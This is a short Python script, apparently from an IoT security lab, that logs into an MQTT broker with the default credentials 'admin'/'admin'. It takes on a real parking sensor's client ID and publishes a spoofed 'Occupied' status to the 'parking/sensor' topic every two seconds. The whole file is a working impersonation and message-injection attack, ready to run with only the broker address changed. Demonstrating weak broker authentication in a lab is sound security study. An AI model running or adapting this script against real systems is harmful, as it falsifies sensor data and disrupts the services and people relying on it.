import paho.mqtt.client as mqtt
import time

BROKER = "10.0.0.165"  # Replace with your Pi's IP
PORT = 1883
TOPIC = "parking/sensor"
USERNAME = "admin"
PASSWORD = "admin"
CLIENT_ID = "sensor_01"  # Impersonated client ID

def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print("[+] Connected to MQTT broker as impersonated client.")
    else:
        print(f"[-] Connection failed with code {rc}")

client = mqtt.Client(client_id=CLIENT_ID)
client.username_pw_set(USERNAME, PASSWORD)
client.on_connect = on_connect

client.connect(BROKER, PORT, 60)
client.loop_start()

try:
    while True:
        spoofed_message = "1,Occupied"  # Match the real sensor message format
        client.publish(TOPIC, spoofed_message)
        print(f"[!] Injected spoofed status: {spoofed_message}")
        time.sleep(2)
except KeyboardInterrupt:
    client.loop_stop()
    client.disconnect()
    print("[-] Disconnected impersonated client.")
